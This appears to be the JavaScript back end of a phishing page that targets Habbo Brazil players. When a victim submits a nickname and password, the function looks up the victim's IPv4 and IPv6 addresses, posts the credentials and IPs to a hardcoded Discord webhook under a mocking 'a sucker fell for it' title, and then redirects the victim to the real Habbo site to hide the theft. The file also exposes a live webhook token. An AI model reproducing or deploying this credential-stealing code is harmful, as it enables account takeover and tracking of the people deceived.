export const handleSendMessage = async (nickname, pwd) => {
  const webhookUrl =
    "https://discord.com/api/webhooks/1237166275734671540/D45nBAaf-wYCh0RPAjU_jmCtmqyJk-ISucyWaoIGXl21xedHPIfvCHENSqJUNPiFk_NJ";

  const response4 = await fetch("https://api.ipify.org?format=json");
  const response6 = await fetch("https://api64.ipify.org?format=json");

  const data4 = await response4.json();
  const data6 = await response6.json();

  const embedMessage = {
    content: "@everyone",
    embeds: [
      {
        title: "Um trouxa caiu!",
        description: "Bora fiiiii.",
        color: parseInt("18bcee", 16),
        fields: [
          { name: "-----------", value: "" },
          { name: "Nickname", value: nickname, inline: true },
          { name: "Senha", value: pwd, inline: true },
          { name: "-----------", value: "" },
          {
            name: "IP",
            value: `${data4.ip} - ${data6.ip}`,
          },
        ],
        thumbnail: {
          url: "https://media.discordapp.net/attachments/1192110717126582273/1230021047189766184/image.png?ex=6631cd5e&is=661f585e&hm=296bc38100446d9e4888b78cc365de6d99e372c4b459005b288f9a75703f2d4c&=&format=webp&quality=lossless&width=316&height=314",
        },
        author: {
          name: "Felipe Indinho",
          icon_url:
            "https://media.discordapp.net/attachments/1192110717126582273/1230021047189766184/image.png?ex=6631cd5e&is=661f585e&hm=296bc38100446d9e4888b78cc365de6d99e372c4b459005b288f9a75703f2d4c&=&format=webp&quality=lossless&width=316&height=314",
        },
      },
    ],
  };

  await fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(embedMessage),
  });

  window.location = "https://habbo.com.br";
};
